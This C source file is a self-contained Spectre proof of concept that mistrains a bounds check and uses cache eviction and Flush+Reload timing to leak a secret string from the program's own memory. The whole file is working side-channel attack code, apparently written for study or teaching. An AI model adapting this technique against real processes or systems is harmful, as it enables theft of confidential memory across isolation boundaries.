#include "../color.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <ctype.h>
#include <inttypes.h>

#include "timer.h"
#include "evict.h"

#define PAGE_SIZE 4096
#define CACHE_LINE_SIZE 256
#define SYMBOL_CNT (1 << (sizeof(char) * 7))
#define ISB() __asm__ __volatile__("isb" ::: "memory")

// The secret information
const char *secret = "The cake is a lie!";

void fence(void) {
    __asm__ __volatile__("" ::: "memory");
}

uint32_t _time_maccess(void* ptr) {
    ISB();
    uint64_t t0 = timer_now();
    ISB();
    volatile unsigned char tmp = *(volatile unsigned char *)ptr;
    (void)tmp;
    ISB();
    uint64_t t1 = timer_now();
    ISB();
    return t1 - t0;
}

// Branchless select based on the predicate
size_t cselect(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred);
    return (T & mask) | (F & ~mask);
}

// Find the most hit cacheline and safely decode its character
void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    uint64_t most_hits = 0, scd_most_hits = 0;
    unsigned char raw_c = '\0', scd_raw_c = '\0';

    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
        if (most_hits < hits[i]) {
            scd_most_hits = most_hits;
            scd_raw_c = raw_c;
            most_hits = hits[i];
            raw_c = i;
        }
    }

    *c = isprint(raw_c) ? raw_c : '?';
    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3llu); "
           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3llu)\n",
           *c, raw_c, most_hits, scd_c, scd_raw_c, scd_most_hits);
}

uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
volatile int32_t array_size = 8;

int naive_victim(uint8_t *pages, int64_t idx, size_t stride) {
    if (idx < array_size) {
        volatile uint8_t temp = *(pages+(*(array+idx) * stride));
        // printf("%c\n" , *(array+idx));
    }
    return 0;
}

void naive_attacker() {
    timer_init(true, 1);
    uint64_t threshold = calibrate_latency();
    find_fuzzy_eviction_set();

    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[100] = { '\0' };

    // Pages for Flush+Reload
    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return;
    }

    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
    printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);

    size_t stride = PAGE_SIZE;
    int64_t malicious_index = (int64_t)secret - (int64_t)array;

    printf("Secret address: %p, Array address: %p\n", secret, array);
    printf("The malicious index is %p-%p=%#x\n", secret, array,
           malicious_index);
    printf("-----------------------------------------\n");

    for (size_t c = 0; c < strlen(secret); c++) {
        for (size_t r = 0; r < 100; r++) {
            // shuffle_ptrs_ext();
            
            for (size_t t = 0; t < 16; t++) {
                bool is_attack = (t % 16 == 16 - 1);
                int64_t index = cselect(malicious_index + c, 0, is_attack);

                fuzzy_evict();
                // printf("fuzzy evict\n");
                fence();
                naive_victim(pages, index, stride);
            }

            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                uint8_t *ptr = pages + stride * idx;
                hits[idx] += _time_maccess(ptr) < threshold;
            }
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits));
    }

    timer_shutdown();
    printf("Recovered secret: \"%s\"\n", buf);
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
    return;
}

int main(int argc, char **argv) {
    printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
    naive_attacker();
    return 0;
}
